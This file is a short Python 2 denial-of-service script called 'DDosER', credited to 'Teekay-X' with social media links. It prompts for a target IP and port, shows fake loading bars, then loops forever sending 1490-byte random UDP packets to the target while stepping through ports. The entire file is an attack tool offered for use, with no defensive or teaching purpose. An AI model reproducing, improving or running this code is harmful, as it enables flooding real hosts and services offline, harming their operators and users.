#created by Teekay-X GIVE credit when copied

import sys
import os
import time
import socket
import random
#Code it 
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet \" DDosER \" | lolcat " )
print
print "Author   : Teekay-X "
print "You Tube : https://youtube.com/channel/UCo1OUS8i8K-eG9ZXGkvaG-Q"
print "github   : https://github.com/Teekay-X"
print "Facebook : https://www.facebook.com/young.tk.33633"
print
ip = raw_input("\033[31mIP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet \" LOADING  \" | lolcat")
print "[=                   ] 1% "
time.sleep(5)
os.system("clear")
os.system("figlet \" LOADING  \" | lolcat")
print "[=====               ] 33%"
time.sleep(5)
os.system("clear")
os.system("figlet \" LOADING  \" | lolcat")
print "[==========          ] 52%"
time.sleep(5)
os.system("clear")
os.system("figlet \" LOADING  \" | lolcat")
print "[===============     ] 76%"
time.sleep(5)
os.system("clear")
os.system("figlet \" LOADING  \" | lolcat")
print "[====================] 100%"
time.sleep(3)
sent = 0
while True:
  try:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "\033[31mSenDING  %s packets to %s throught port:\033[32m %s"%(sent,ip,port)
     if port == 65534:
       port = 1
  except KeyboardInterrupt as inter:
         print inter
